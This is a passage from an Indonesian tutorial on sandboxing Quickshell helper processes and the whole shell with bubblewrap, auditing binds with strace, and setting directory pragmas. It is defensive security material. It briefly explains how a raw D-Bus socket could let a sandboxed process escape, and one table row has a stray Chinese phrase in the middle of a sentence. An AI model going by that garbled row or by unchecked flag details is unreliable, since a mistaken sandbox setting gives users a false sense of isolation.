        '--symlink', 'usr/lib', '/lib64',
        '--symlink', 'usr/bin', '/bin',
        '--proc', '/proc',
        '--dev', '/dev',
        '--unshare-all',
        '--die-with-parent',
        '--new-session',
        '/usr/bin/cat', '/proc/loadavg'
    ]
    running: true
    stdout: StdioCollector { onStreamFinished: console.log(this.text.trim()) }
}
```

**Penjelasan kata demi kata:**

| Argumen | Penjelasan |
|---|---|
| `'bwrap'` | Nama program yang dijalankan. |
| `'--ro-bind', '/usr', '/usr'` | **Bind mount read-only**: Menyediakan direktori `/usr` dari host ke dalam sandbox pada path yang sama (`/usr`), tetapi **read-only**. Ini memberi akses ke binary dan library sistem tanpa risiko modifikasi. |
| `'--symlink', 'usr/lib', '/lib'` | Membuat symlink `/lib` → `usr/lib` di dalam sandbox. Di banyak distro modern, `/lib` adalah symlink ke `usr/lib`; ini mereplikasi struktur tersebut. |
| `'--symlink', 'usr/lib', '/lib64'` | Sama seperti di atas, untuk `/lib64` (library 64-bit). |
| `'--symlink', 'usr/bin', '/bin'` | Membuat symlink `/bin` → `usr/bin`. Di sistem modern, `/bin` sering berupa symlink ke `usr/bin`. |
| `'--proc', '/proc'` | **Mount `/proc` baru** di dalam sandbox. Ini memberikan **PID namespace** baru (karena `--unshare-all` juga meng-unshare PID), sehingga `/proc` hanya menampilkan proses di dalam sandbox. |
| `'--dev', '/dev'` | **Mount `/dev` baru** (tmpfs) dengan perangkat minimal (null, zero, random, dll.). Ini adalah `/dev` yang terisolasi, bukan `/dev` host. |
| `'--unshare-all'` | **Unshare semua namespace yang memungkinkan**: user, PID, network, IPC, UTS, cgroup, dan mount. Ini adalah isolasi maksimal. **Catatan:** `--unshare-all` juga meng-unshare network, sehingga **tidak ada akses jaringan** sama sekali. |
| `'--die-with-parent'` | Memastikan proses `bwrap` (dan semua proses di dalamnya) **mati** jika proses induk (Quickshell) mati. Mencegah proses yatim. |
| `'--new-session'` | Membuat **sesi baru** (session ID baru) untuk proses di dalam sandbox. Ini mencegah proses mengakses terminal kontrol (TTY) host dan memberikan isolasi tambahan. |
| `'/usr/bin/cat', '/proc/loadavg'` | Perintah yang dijalankan **di dalam sandbox**: `cat` membaca file `/proc/loadavg` (yang sekarang berasal dari `/proc` sandbox, bukan host). |
| `stdout: StdioCollector { ... }` | Menangkap output standar dari `cat` dan mencatatnya ke log Quickshell setelah stream selesai. |

**Apa yang dicapai oleh konfigurasi ini:**
- Helper hanya bisa melihat `/usr` (read-only), `/proc` (terisolasi), dan `/dev` (minimal).
- Helper **tidak bisa** melihat `~` (home directory), `/etc`, atau file host lainnya.
- Helper **tidak memiliki akses jaringan** (karena `--unshare-all`).
- Helper **tidak bisa** melihat atau mengirim sinyal ke proses host (PID namespace terpisah).
- Jika helper mencoba membaca `~/.ssh/id_rsa`, ia akan mendapatkan **"No such file or directory"** karena `~` tidak ada di dalam sandbox.

#### Contoh 2: Sandbox dengan Akses Jaringan Terbatas (untuk Helper yang Perlu Mengunduh Data)

Jika helper perlu mengunduh data cuaca, Anda **tidak** bisa menggunakan `--unshare-all` karena itu akan memblokir jaringan. Sebagai gantinya, gunakan `--unshare-all` lalu **share kembali** network namespace dengan `--share-net`.

```qml
Process {
    command: [
        'bwrap',
        '--ro-bind', '/usr', '/usr',
        '--symlink', 'usr/lib', '/lib',
        '--symlink', 'usr/lib', '/lib64',
        '--symlink', 'usr/bin', '/bin',
        '--ro-bind', '/etc/resolv.conf', '/etc/resolv.conf',
        '--ro-bind', '/etc/ssl', '/etc/ssl',
        '--proc', '/proc',
        '--dev', '/dev',
        '--unshare-all',
        '--share-net',                    // <-- Kembalikan akses jaringan
        '--die-with-parent',
        '--new-session',
        '/usr/bin/curl', '-s', 'https://wttr.in/?format=3'
    ]
    running: true
    stdout: StdioCollector { onStreamFinished: console.log(this.text.trim()) }
}
```

**Penjelasan tambahan:**
- `'--ro-bind', '/etc/resolv.conf', '/etc/resolv.conf'`: Memberikan akses **read-only** ke `/etc/resolv.conf` agar DNS resolution berfungsi. Tanpa ini, `curl` tidak bisa menerjemahkan nama domain.
- `'--ro-bind', '/etc/ssl', '/etc/ssl'`: Memberikan akses ke sertifikat SSL/TLS (diperlukan untuk HTTPS).
- `'--share-net'`: **Membatalkan** isolasi network namespace. Proses sekarang berbagi network namespace dengan host, sehingga dapat mengakses internet. **Gunakan ini hanya jika benar-benar diperlukan.**

**Risiko:** Dengan `--share-net`, helper dapat mengakses **seluruh jaringan** yang dapat diakses host. Ini termasuk localhost (layanan lokal), LAN, dan internet. Jika helper terkompromi, penyerang dapat memindai jaringan lokal atau mengakses layanan yang seharusnya tidak terekspos.

**Mitigasi tambahan:** Jika memungkinkan, gunakan **network namespace terpisah** dengan aturan firewall (`iptables`/`nftables`) yang membatasi akses keluar. Namun, ini memerlukan setup yang lebih kompleks dan biasanya dilakukan di luar `bwrap` (mis. dengan `slirp4netns` atau `pasta`).

#### Contoh 3: Sandbox dengan Akses Tulis ke Direktori Sementara

Jika helper perlu menulis file sementara (mis. cache unduhan), gunakan `--tmpfs` untuk menyediakan direktori sementara yang **terisolasi** dan **hilang** saat proses selesai.

```qml
Process {
    command: [
        'bwrap',
        '--ro-bind', '/usr', '/usr',
        '--symlink', 'usr/lib', '/lib',
        '--symlink', 'usr/lib', '/lib64',
        '--symlink', 'usr/bin', '/bin',
        '--proc', '/proc',
        '--dev', '/dev',
        '--tmpfs', '/tmp',                 // <-- /tmp terisolasi
        '--unshare-all',
        '--die-with-parent',
        '--new-session',
        '/usr/bin/bash', '-c', 'echo "data sementara" > /tmp/cache.txt && cat /tmp/cache.txt'
    ]
    running: true
    stdout: StdioCollector { onStreamFinished: console.log(this.text.trim()) }
}
```

**Penjelasan:**
- `'--tmpfs', '/tmp'`: Membuat filesystem tmpfs baru yang di-mount di `/tmp` di dalam sandbox. File yang ditulis ke `/tmp` **tidak terlihat** oleh host dan **hilang** saat sandbox berakhir. Ini mencegah helper menulis ke `/tmp` host (yang bisa menjadi vektor serangan).

### 4.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Bubblewrap (`bwrap`)** | Alat sandbox ringan berbasis namespace, awalnya untuk Flatpak. |
| **Bind mount** | Mount yang "meminjam" direktori dari host ke dalam sandbox. `--ro-bind` = read-only; `--bind` = read-write. |
| **`--unshare-all`** | Flag untuk meng-unshare semua namespace yang memungkinkan (user, PID, network, IPC, UTS, cgroup, mount). |
| **`--die-with-parent`** | Memastikan proses sandbox mati jika induknya mati. |
| **`--new-session`** | Membuat sesi baru (SID baru) untuk proses di dalam sandbox, mencegah akses ke TTY host. |
| **`--tmpfs`** | Membuat filesystem sementara di dalam sandbox yang hilang saat proses selesai. |
| **`--share-net`** | Membatalkan isolasi network namespace (mengembalikan akses jaringan). |

### 4.5 Visualisasi: Arsitektur Sandbox `bwrap`

```text
HOST (Quickshell berjalan dengan hak penuh)
│
│  Process {
│      command: ['bwrap', ...]
│  }
│
▼
┌─────────────────────────────────────────────────────────────────┐
│                        BWRAP (proses induk sandbox)             │
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │              SANDBOX (namespace terisolasi)                │ │
│  │                                                            │ │
│  │  Filesystem:                  Network:                     │ │
│  │  /usr (ro-bind)               (kosong — unshare-all)       │ │
│  │  /lib → usr/lib (symlink)     (atau --share-net jika perlu)│ │
│  │  /bin → usr/bin (symlink)                                  │ │
│  │  /proc (baru, PID ns)         IPC: terpisah                │ │
│  │  /dev (minimal)               UTS: hostname sandbox        │ │
│  │  /tmp (tmpfs, opsional)       PID: hanya proses sandbox    │ │
│  │                                                            │ │
│  │  ┌───────────────────────────────────────────────────────┐ │ │
│  │  │  Helper Process (/usr/bin/cat, /usr/bin/curl, dll.)   │ │ │
│  │  │  ► Tidak bisa melihat ~, /etc (kecuali di-bind)       │ │ │
│  │  │  ► Tidak bisa melihat proses host                     │ │ │
│  │  │  ► Tidak bisa mengakses jaringan (kecuali --share-net)│ │ │
│  │  └───────────────────────────────────────────────────────┘ │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
   [Output helper dikembalikan ke Quickshell melalui stdout]
```

### 4.6 Hubungan dengan Modul Lain

- **Prasyarat:** Bagian 3 (Namespace Linux) — `bwrap` adalah antarmuka praktis untuk namespace.
- **Melanjutkan ke:** Bagian 5 (Sandbox seluruh shell) — teknik yang sama, tetapi dengan lebih banyak bind dan jebakan.
- **Terkait:** Modul 4.3 (`xdg-dbus-proxy`) — sandbox D-Bus adalah pelengkap `bwrap`. `bwrap` mengisolasi filesystem/jaringan/PID; `xdg-dbus-proxy` mengisolasi D-Bus.

### 4.7 Sumber Referensi

- **Bubblewrap GitHub:** [https://github.com/containers/bubblewrap](https://github.com/containers/bubblewrap) — Sumber resmi dan dokumentasi.
- **Arch Wiki: Bubblewrap:** [https://wiki.archlinux.org/title/Bubblewrap](https://wiki.archlinux.org/title/Bubblewrap) — Panduan praktis untuk Arch.
- **`bwrap(1)` man page:** [https://man.archlinux.org/man/bwrap.1](https://man.archlinux.org/man/bwrap.1) — Referensi lengkap semua opsi.
- **Flatpak Sandboxing:** [https://docs.flatpak.org/en/latest/sandbox-permissions.html](https://docs.flatpak.org/en/latest/sandbox-permissions.html) — Konsep sandbox dari Flatpak (yang menggunakan `bwrap`).

### 4.8 Tips dan Praktik Terbaik

- **Gunakan `--die-with-parent` selalu.** Ini adalah pengaman wajib.
- **Mulai dari `--unshare-all`, lalu tambahkan akses.** Ini adalah pendekatan "default-deny" yang lebih aman.
- **Uji sandbox Anda.** Setelah membuat sandbox, coba akses file atau jaringan yang seharusnya diblokir. Jika berhasil diakses, ada kebocoran.
- **Gunakan `--ro-bind` untuk `/usr`, bukan `--bind`.** Hampir tidak ada alasan untuk menulis ke `/usr` dari dalam sandbox.
- **Pertimbangkan `--tmpfs /tmp`.** Mencegah helper menulis ke `/tmp` host, yang bisa menjadi vektor serangan (mis. symlink attack).

### 4.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Lupa `--proc /proc` sehingga helper tidak bisa membaca `/proc` (banyak program membutuhkannya). | Tambahkan `--proc /proc` **setelah** `--unshare-all` (karena PID namespace baru membutuhkan `/proc` baru). |
| Menggunakan `--bind` (read-write) untuk `/usr` sehingga helper bisa memodifikasi binary sistem. | Gunakan `--ro-bind` untuk semua yang tidak perlu ditulis. |
| Lupa `--dev /dev` sehingga helper tidak bisa mengakses `/dev/null`, `/dev/random`, dll. | Tambahkan `--dev /dev` untuk memberikan perangkat minimal. |
| Mengira `--unshare-all` sudah cukup untuk keamanan penuh. | `--unshare-all` tidak memblokir akses ke D-Bus (jika socket di-bind) atau side-channel. Gunakan lapisan tambahan. |
| Tidak menguji sandbox, sehingga helper gagal karena缺少依赖. | Uji dengan `strace` atau jalankan helper secara manual di dalam `bwrap` untuk melihat error. |

---

## 5. Sandbox Seluruh Shell: Hard Mode dan Jebakan Pewarisan

### 5.1 Deskripsi Konkret & Peran dalam Kurikulum

Jika Bagian 4 berfokus pada sandbox **proses pembantu**, Bagian 5 membahas sandbox **seluruh shell**—Quickshell itu sendiri. Ini adalah **hard mode**: jauh lebih kompleks karena shell membutuhkan akses ke Wayland socket, D-Bus, GPU, dan berbagai sumber daya sistem.

Mengapa melakukan ini? Jika Anda menjalankan shell dari konfigurasi yang **benar-benar tidak tepercaya** (mis. dari internet), atau jika Anda ingin **pertahanan berlapis** bahkan terhadap shell Anda sendiri, sandbox seluruh shell adalah pilihan. Namun, ada **jebakan besar** yang harus dipahami: **proses anak mewarisi sandbox**.

### 5.2 Konsep Kunci & Filosofi Mendalam

**Analogi:** Sandbox seluruh shell seperti **mengurung seluruh apartemen** Anda, bukan hanya satu ruangan. Anda masih bisa tinggal di dalamnya, tetapi Anda tidak bisa keluar. Jika Anda mengundang tamu (aplikasi yang diluncurkan dari launcher) ke dalam apartemen, mereka juga **terkurung**—mereka tidak bisa keluar untuk mengakses internet atau layanan lain.

**Jebakan pewarisan:** Ketika Anda menjalankan Quickshell di dalam `bwrap`, **semua proses yang diluncurkan oleh Quickshell** (melalui `Process` atau launcher) **mewarisi** namespace dan batasan yang sama. Jika Anda meng-unshare network (`--unshare-net`), maka **aplikasi yang diluncurkan dari launcher tidak akan memiliki akses jaringan**. Ini adalah perilaku yang benar secara keamanan, tetapi bisa **merusak fungsionalitas** jika tidak ditangani.

**Strategi untuk mengatasi jebakan ini:**

1.  **Luncurkan aplikasi melalui compositor:** Jika shell Anda adalah bagian dari compositor (mis. Hyprland), aplikasi yang diluncurkan melalui keybind compositor **tidak** mewarisi sandbox shell (karena mereka diluncurkan oleh compositor, bukan oleh shell).
2.  **Gunakan `systemd-run --user`:** Jika shell Anda perlu meluncurkan aplikasi, gunakan `systemd-run --user --scope` atau `systemd-run --user --unit=...` untuk menjalankan aplikasi di **luar** unit shell. Ini memerlukan D-Bus yang berfungsi di dalam sandbox (lihat Modul 4.3).
3.  **Gunakan `startDetached()`:** Quickshell menyediakan `Process.startDetached()` yang menjalankan proses **terpisah** dari Quickshell. Namun, **ini tidak secara otomatis keluar dari sandbox** jika Quickshell sendiri di-sandbox. Proses yang di-start detached masih mewarisi namespace.

**Kapan sandbox seluruh shell **layak** dilakukan:**
- Anda menjalankan shell dari konfigurasi yang tidak sepenuhnya Anda audit.
- Anda ingin perlindungan tambahan terhadap eksploitasi Quickshell.
- Anda sudah siap dengan solusi untuk aplikasi yang diluncurkan (compositor atau `systemd-run`).

**Kapan **tidak** layak:**
- Anda menggunakan shell sebagai launcher utama untuk banyak aplikasi.
- Anda tidak memiliki cara untuk meluncurkan aplikasi di luar sandbox.
- Anda tidak ingin menghabiskan waktu men-debug bind mount yang rumit.

### 5.3 Sintaks Dasar / Contoh Implementasi Inti: Kerangka Sandbox Seluruh Shell

Berikut adalah kerangka dari materi asli, dengan penjelasan tambahan.

```bash
# Kerangka sandbox SELURUH shell (hard mode).
# Iterasi bind berdasarkan galat dan strace; path tanpa spasi.
args=(
  --ro-bind /usr /usr
  --symlink usr/lib /lib --symlink usr/lib /lib64 --symlink usr/bin /bin
  --ro-bind /etc /etc
  --proc /proc --dev /dev --dev-bind /dev/dri /dev/dri --ro-bind /sys /sys
  --ro-bind $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY
  --ro-bind $HOME/.config/quickshell/my-shell $HOME/.config/quickshell/my-shell
  --bind $XDG_RUNTIME_DIR/qs-bus $XDG_RUNTIME_DIR/bus
  --setenv XDG_RUNTIME_DIR $XDG_RUNTIME_DIR --setenv WAYLAND_DISPLAY $WAYLAND_DISPLAY
  --setenv DBUS_SESSION_BUS_ADDRESS unix:path=$XDG_RUNTIME_DIR/bus
  --unshare-pid --unshare-ipc --unshare-uts --die-with-parent
)
bwrap "${args[@]}" quickshell -c my-shell
# Kemungkinan perlu menambah: socket IPC compositor, $XDG_RUNTIME_DIR/quickshell, socket D-Bus sistem.
```

**Penjelasan kata demi kata (fokus pada yang baru/berbeda dari Bagian 4):**

| Argumen | Penjelasan |
|---|---|
| `--ro-bind /etc /etc` | Memberikan akses **read-only** ke `/etc` (diperlukan untuk banyak konfigurasi sistem, font, dll.). **Risiko:** `/etc` berisi informasi sensitif (mis. `/etc/shadow` tidak dapat dibaca oleh pengguna non-root, tetapi `/etc/passwd` bisa). Pertimbangkan untuk hanya meng-bind subdirektori tertentu. |
| `--dev-bind /dev/dri /dev/dri` | **Device bind mount** untuk `/dev/dri` (Direct Rendering Infrastructure). Diperlukan untuk akses GPU (Wayland compositor membutuhkan GPU untuk rendering). **Ini adalah kebocoran isolasi:** shell dapat mengakses GPU secara langsung. Namun, tanpa ini, Wayland tidak akan berfungsi. |
| `--ro-bind /sys /sys` | Memberikan akses **read-only** ke `/sys` (informasi perangkat keras, daya, dll.). Diperlukan untuk beberapa fitur (mis. pembacaan suhu, kecerahan). |
| `--ro-bind $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY ...` | Meng-bind **Wayland socket** ke dalam sandbox. Tanpa ini, Quickshell tidak bisa terhubung ke compositor. Path `$XDG_RUNTIME_DIR/$WAYLAND_DISPLAY` biasanya seperti `/run/user/1000/wayland-1`. |
| `--ro-bind $HOME/.config/quickshell/my-shell ...` | Meng-bind **direktori konfigurasi shell** ke dalam sandbox. Ini adalah konfigurasi yang Anda percaya (Anda sendiri yang menulisnya). Mengapa read-only? Agar shell tidak bisa memodifikasi konfigurasinya sendiri (mencegah self-modification attack). Jika shell perlu menulis state, gunakan `--bind` untuk direktori state. |
| `--bind $XDG_RUNTIME_DIR/qs-bus $XDG_RUNTIME_DIR/bus` | **Bind mount read-write** untuk **socket D-Bus yang telah disaring** (`qs-bus`) ke path `bus` di dalam sandbox. **Catatan penting:** Ini **bukan** socket D-Bus sesi mentah. Ini adalah socket yang dibuat oleh `xdg-dbus-proxy` (lihat Modul 4.3). Meng-bind socket D-Bus mentah ke dalam sandbox **berbahaya** karena bus sesi tidak memiliki kebijakan akses seperti bus sistem; proses di dalam sandbox dapat meminta layanan lain (termasuk manajer systemd pengguna) untuk menjalankan program di luar sandbox. |
| `--setenv XDG_RUNTIME_DIR ...` | Menyetel variabel lingkungan `XDG_RUNTIME_DIR` di dalam sandbox agar sesuai dengan path host. Diperlukan agar aplikasi (termasuk Quickshell) menemukan socket Wayland dan D-Bus. |
| `--setenv WAYLAND_DISPLAY ...` | Menyetel `WAYLAND_DISPLAY` agar Quickshell terhubung ke compositor. |
| `--setenv DBUS_SESSION_BUS_ADDRESS unix:path=$XDG_RUNTIME_DIR/bus` | Menyetel alamat D-Bus sesi ke socket yang telah disaring. |
| `--unshare-pid --unshare-ipc --unshare-uts` | Meng-unshare PID, IPC, dan UTS namespace. **Perhatikan:** Berbeda dengan Bagian 4, di sini kita **tidak** menggunakan `--unshare-all`. Kita **tidak** meng-unshare network (karena shell mungkin perlu jaringan) dan **tidak** meng-unshare user (karena kita menjalankan sebagai pengguna biasa dan tidak perlu pemetaan UID). |
| `quickshell -c my-shell` | Perintah yang dijalankan di dalam sandbox: Quickshell dengan konfigurasi `my-shell`. |

**Mengapa tidak menggunakan `--unshare-all` di sini?**
- `--unshare-all` akan meng-unshare **network**, yang akan memutus akses shell ke jaringan (mungkin tidak diinginkan).
- `--unshare-all` juga meng-unshare **user**, yang dapat menyebabkan masalah dengan akses file (UID di dalam sandbox berbeda dari host).
- Kita memilih **unshare selektif**: PID, IPC, UTS—cukup untuk isolasi dasar tanpa merusak fungsionalitas.

### 5.4 Audit dengan `strace`: Menemukan Bind yang Hilang

Kerangka di atas mungkin **belum cukup**. Quickshell dan compositor mungkin membutuhkan akses ke file atau socket lain yang belum di-bind. Cara menemukannya adalah dengan **`strace`**:

```bash
# Jalankan Quickshell di bawah strace, catat semua akses file
strace -f -e trace=file -o /tmp/qs.trace quickshell -c my-shell

# Cari error ENOENT (file tidak ditemukan) atau EACCES (izin ditolak)
grep -E 'ENOENT|EACCES' /tmp/qs.trace | head -50
```

**Penjelasan:**
- `strace -f`: Mengikuti proses anak (fork).
- `-e trace=file`: Hanya merekam syscall yang berkaitan dengan file (open, stat, access, dll.).
- `-o /tmp/qs.trace`: Menyimpan output ke file.
- `grep -E 'ENOENT|EACCES'`: Mencari baris yang mengandung "No such file or directory" atau "Permission denied."

**Cara menggunakan hasil strace:**
1.  Jalankan Quickshell **tanpa** sandbox terlebih dahulu, dengan `strace`.
2.  Lihat file/socket apa yang diakses.
3.  Tentukan mana yang **perlu** di-bind ke dalam sandbox.
4.  Tambahkan `--ro-bind` atau `--bind` yang sesuai.
5.  Ulangi sampai tidak ada error yang signifikan.

**Contoh hasil strace dan interpretasinya:**

```text
openat(AT_FDCWD, "/run/user/1000/wayland-1", O_RDWR) = 5
openat(AT_FDCWD, "/home/user/.config/quickshell/my-shell/shell.qml", O_RDONLY) = 6
openat(AT_FDCWD, "/usr/share/fonts/...", O_RDONLY) = 7
connect(5, {sa_family=AF_UNIX, sun_path="/run/user/1000/bus"}, 110) = -1 EACCES (Permission denied)
```

**Interpretasi:**
- Baris 1: Quickshell membuka Wayland socket → perlu di-bind.
- Baris 2: Quickshell membuka konfigurasi → perlu di-bind.
- Baris 3: Quickshell membuka font → sudah tercakup oleh `--ro-bind /usr /usr`.
- Baris 4: Quickshell mencoba terhubung ke D-Bus **mentah** → **EACCES**. Ini benar! Kita **tidak** ingin meng-bind D-Bus mentah. Sebaliknya, kita meng-bind socket yang telah disaring (`qs-bus`).

### 5.5 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Pewarisan sandbox (sandbox inheritance)** | Proses anak mewarisi namespace dan batasan dari proses induk. Jika induk di-sandbox, anak juga di-sandbox. |
| **`systemd-run --user --scope`** | Menjalankan perintah di dalam **scope** systemd baru, yang berada di luar unit shell (jika shell adalah unit systemd). Ini adalah cara untuk "keluar" dari sandbox shell untuk aplikasi yang diluncurkan. |
| **`startDetached()`** | Metode Quickshell `Process` untuk menjalankan proses yang tidak terkait dengan lifecycle Quickshell. Namun, **tidak** keluar dari sandbox. |
| **Wayland socket** | Unix domain socket yang digunakan klien Wayland untuk berkomunikasi dengan compositor. |
| **D-Bus session bus** | Bus D-Bus per pengguna, yang **tidak** memiliki kebijakan akses seperti bus sistem. |

### 5.6 Visualisasi: Jebakan Pewarisan Sandbox

```text
┌──────────────────────────────────────────────────────────────────┐
│                        HOST (di luar sandbox)                    │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │  BWRAP (sandbox seluruh shell)                             │  │
│  │                                                            │  │
│  │  ┌───────────────────────────────────────────────────────┐ │  │
│  │  │  Quickshell (di dalam sandbox)                        │ │  │
│  │  │                                                       │ │  │
│  │  │  Process { command: ["firefox"] }                     │ │  │
│  │  │         │                                             │ │  │
│  │  │         ▼                                             │ │  │
│  │  │  ┌──────────────────────────────────────────────────┐ │ │  │
│  │  │  │  Firefox (proses anak)                           │ │ │  │
│  │  │  │  ► MEWARISI sandbox!                             │ │ │  │
│  │  │  │  ► Tidak bisa akses jaringan (jika --unshare-net)│ │ │  │
│  │  │  │  ► Tidak bisa akses ~ (jika tidak di-bind)       │ │ │  │
│  │  │  └──────────────────────────────────────────────────┘ │ │  │
│  │  └───────────────────────────────────────────────────────┘ │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │  Alternatif: Luncurkan Firefox melalui systemd-run --user  │  │
│  │  (di luar unit shell → di luar sandbox)                    │  │
│  └────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

**Penjelasan diagram:**
- Quickshell di dalam `bwrap` meluncurkan Firefox melalui `Process`.
- Firefox **mewarisi** namespace dan batasan `bwrap`.
- Jika `bwrap` menggunakan `--unshare-net`, Firefox **tidak bisa** mengakses internet.
- Untuk menghindari ini, luncurkan Firefox melalui `systemd-run --user` (yang berada di luar unit shell) atau melalui keybind compositor.

### 5.7 Hubungan dengan Modul Lain

- **Prasyarat:** Bagian 4 (Bubblewrap untuk helper) — teknik dasar yang sama.
- **Melanjutkan ke:** Bagian 6 (Pragma Quickshell) — mengelola direktori shell di dalam sandbox.
- **Terkait:** Modul 4.3 (D-Bus filtering dan `systemd-run`) — solusi untuk jebakan pewarisan.

### 5.8 Sumber Referensi

- **Quickshell `startDetached()`:** [https://quickshell.org/docs/types/Quickshell.Io/Process#startDetached](https://quickshell.org/docs/types/Quickshell.Io/Process#startDetached) — Dokumentasi resmi.
- **`systemd-run` man page:** [https://www.freedesktop.org/software/systemd/man/systemd-run.html](https://www.freedesktop.org/software/systemd/man/systemd-run.html) — Referensi `systemd-run`.
- **Wayland Security:** [https://wayland.freedesktop.org/docs/html/ch04.html](https://wayland.freedesktop.org/docs/html/ch04.html) — Model keamanan Wayland.

### 5.9 Tips dan Praktik Terbaik

- **Jangan sandbox seluruh shell kecuali Anda benar-benar membutuhkannya.** Ini menambah kompleksitas yang signifikan.
- **Gunakan `strace` secara iteratif.** Jangan mencoba menebak semua bind dari awal. Mulai dari kerangka minimal, jalankan, lihat error, tambahkan bind, ulangi.
- **Pisahkan direktori konfigurasi dan state.** Bind konfigurasi sebagai read-only; bind state sebagai read-write (jika perlu).
- **Gunakan `--unshare-pid` dan `--unshare-ipc` bahkan jika Anda tidak meng-unshare network.** Ini memberikan isolasi yang berarti tanpa merusak fungsionalitas.
- **Dokumentasikan bind yang Anda tambahkan.** Setiap bind adalah **kompromi keamanan**; catat mengapa itu diperlukan.

### 5.10 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Menggunakan `--unshare-all` untuk seluruh shell, lalu bingung mengapa aplikasi yang diluncurkan tidak punya jaringan. | Gunakan unshare selektif (`--unshare-pid --unshare-ipc --unshare-uts`) atau gunakan `--share-net` jika perlu. |
| Lupa meng-bind Wayland socket sehingga Quickshell tidak bisa terhubung ke compositor. | Pastikan `--ro-bind $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY ...` ada. |
| Meng-bind D-Bus sesi **mentah** ke dalam sandbox. | **Jangan lakukan ini.** Gunakan `xdg-dbus-proxy` (Modul 4.3) untuk membuat socket yang disaring, lalu bind socket tersebut. |
| Tidak menguji apakah aplikasi yang diluncurkan berfungsi di dalam sandbox. | Uji dengan aplikasi sederhana (mis. `xterm`, `foot`) sebelum mengandalkan sandbox untuk shell produksi. |

---

## 6. Pemisahan Direktori Runtime/State dengan Pragma Quickshell

### 6.1 Deskripsi Konkret & Peran dalam Kurikulum

Quickshell menyediakan **pragma**—direktif di baris awal file `shell.qml`—yang memungkinkan Anda mengontrol **identitas** shell dan **lokasi direktori** data, state, dan cache. Ini penting untuk keamanan karena:

1.  **Pemisahan:** Shell yang berbeda harus memiliki direktori yang terpisah. Jika satu shell dikompromikan, ia tidak bisa mengakses data shell lain.
2.  **Prediktabilitas:** Direktori default (`~/.local/share/quickshell/by-shell/<shell-id>`) dapat diprediksi. Dengan pragma, Anda bisa menempatkannya di lokasi yang lebih terisolasi.
3.  **Sandbox:** Saat menjalankan shell di dalam `bwrap`, Anda perlu tahu **direktori mana** yang harus di-bind. Pragma membantu Anda mengendalikan ini.

### 6.2 Konsep Kunci & Filosofi Mendalam

**Analogi:** Pragma adalah **"KTP" dan "alamat"** shell Anda. `ShellId` adalah nama uniknya; `DataDir`, `StateDir`, dan `CacheDir` adalah alamat rumah, kantor, dan gudangnya. Jika Anda tidak menentukan alamat, Quickshell akan memberikannya alamat default yang mungkin tidak Anda inginkan.

**Mengapa pemisahan penting untuk keamanan:**
- **Isolasi data:** Jika Anda menjalankan dua shell (mis. shell utama dan shell eksperimental), mereka harus memiliki direktori terpisah. Jika shell eksperimental memiliki bug yang memungkinkan penulisan file sembarangan, ia tidak bisa merusak data shell utama.
- **Audit:** Dengan direktori yang terpisah, Anda bisa dengan mudah melihat file apa yang dibuat oleh shell tertentu.
- **Sandbox:** Saat meng-bind direktori ke dalam sandbox, Anda hanya perlu meng-bind direktori shell yang relevan, bukan seluruh `~/.local/share/quickshell`.

**Pragma yang tersedia:**

| Pragma | Fungsi | Default |
|---|---|---|
| `//@ pragma ShellId <id>` | Menetapkan ID unik shell. ID ini digunakan untuk menurunkan direktori default. | Berdasarkan hash path konfigurasi. |
| `//@ pragma DataDir $BASE/path` | Menimpa direktori data. `$BASE` = `$XDG_DATA_HOME` (biasanya `~/.local/share`). | `~/.local/share/quickshell/by-shell/<shell-id>` |
| `//@ pragma StateDir $BASE/path` | Menimpa direktori state. `$BASE` = `$XDG_STATE_HOME` (biasanya `~/.local/state`). | `~/.local/state/quickshell/by-shell/<shell-id>` |
| `//@ pragma CacheDir $BASE/path` | Menimpa direktori cache. `$BASE` = `$XDG_CACHE_HOME` (biasanya `~/.cache`). | `~/.cache/quickshell/by-shell/<shell-id>` |

### 6.3 Sintaks Dasar / Contoh Implementasi Inti

```qml
// shell.qml — baris awal dengan pragma
//@ pragma ShellId my-secure-shell
//@ pragma DataDir $BASE/quickshell/my-secure-shell/data
//@ pragma StateDir $BASE/quickshell/my-secure-shell/state
//@ pragma CacheDir $BASE/quickshell/my-secure-shell/cache

import Quickshell
// ... sisa konfigurasi
```

**Penjelasan kata demi kata:**
- `//@ pragma ShellId my-secure-shell`: Menetapkan ID shell menjadi `my-secure-shell`. Ini akan digunakan sebagai nama direktori default (jika `DataDir`, dll. tidak ditimpa).
- `//@ pragma DataDir $BASE/quickshell/my-secure-shell/data`: Menimpa direktori data menjadi `~/.local/share/quickshell/my-secure-shell/data` (karena `$BASE` = `~/.local/share`).
- `//@ pragma StateDir $BASE/quickshell/my-secure-shell/state`: Menimpa direktori state menjadi `~/.local/state/quickshell/my-secure-shell/state`.
- `//@ pragma CacheDir $BASE/quickshell/my-secure-shell/cache`: Menimpa direktori cache menjadi `~/.cache/quickshell/my-secure-shell/cache`.

**Mengakses direktori di QML:**

```qml
// Setelah pragma ditetapkan, Anda dapat mengakses direktori melalui singleton Quickshell
Text {
    text: "Data dir: " + Quickshell.dataDir + "\n" +
          "State dir: " + Quickshell.stateDir + "\n" +
          "Cache dir: " + Quickshell.cacheDir + "\n" +
          "Shell ID: " + Quickshell.shellId
}
```

**Penjelasan:**
- `Quickshell.dataDir`, `Quickshell.stateDir`, `Quickshell.cacheDir`: Properti read-only yang mengembalikan path absolut ke direktori yang sesuai.
- `Quickshell.shellId`: Properti read-only yang mengembalikan ID shell.

### 6.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Pragma** | Direktif khusus di baris awal file QML yang memengaruhi perilaku Quickshell. |
| **`ShellId`** | Identitas unik untuk suatu shell. Digunakan untuk menurunkan direktori default dan membedakan instance. |
